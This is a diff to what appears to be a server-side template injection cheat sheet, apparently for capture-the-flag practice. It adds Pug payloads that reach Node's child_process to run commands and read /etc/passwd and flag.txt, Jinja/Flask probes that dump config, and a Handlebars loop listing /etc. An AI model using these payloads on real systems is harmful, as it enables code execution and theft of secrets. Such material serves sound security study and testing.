@@ -123,9 +123,26 @@ ${x("cat /etc/passwd")}
 ### Exploitation (RCE)
 
 ```pug
+- var require = global.process.mainModule.require
+= require('child_process')
+```
+
+```pug
+- var require = global.process.mainModule.require
+= require('child_process').spawnSync('whoami').stdout
+```
+
+```pug
 - var exec = require('child_process').execSync
 = exec('cat /etc/passwd')
 ```
+
+```pug
+- var require = global.process.mainModule.require
+= require('child_process').spawnSync('cat', ['flag.txt']).stdout
+```
+
+
 
 ---
 
@@ -135,8 +152,32 @@ ${x("cat /etc/passwd")}
 
 ### Detection
 
+To find out whether a target is running Jinja, we can leverage the fact that Python handles variables differently than languages like PHP, Java, and JavaScript. For example, if we were to use {{5*5}} as a payload, we would expect "25" as the output. However, what would the output be if we were to use {{5*"5"}}? Let's try it out.
+
 ```jinja
-{{7*7}}            # -> 49
+{{5*"5"}}
+```
+
+In this case, the engine didn't multiply the variables; instead, it displayed "5" five times. This is a great indicator that the target is running Jinja.
+
+Another indicator we can leverage is accessing global variables. These variables are often set by the framework in use. Jinja is developed by the same organization that developed the Flask framework, which is why they are usually paired together. Reviewing the documentation, we learn that Flask sets six global variables: config, request, session, g, url_for(), and get_flashed_messages(). Let's try to use {{ request }} as the payload.
+
+```jinja
+{{request}}
+```
+
+```jinja
+{{config|pprint}}
+```
+
+```jinja
+{{ config.flag }}
+```
+
+
+
+
+```jinja
 {{config.items()}} # Flask-specific
 ```
 
@@ -152,6 +193,12 @@ ${x("cat /etc/passwd")}
 ## Mustache & Handlebars (JavaScript)
 
 ### Detection
+
+```handlebars
+{{#each (readdir "/etc")}}
+   {{this}}
+{{/each}}
+```
 
 ```handlebars
 {{7*7}}      # Will likely render as-is unless logic-less extensions exist
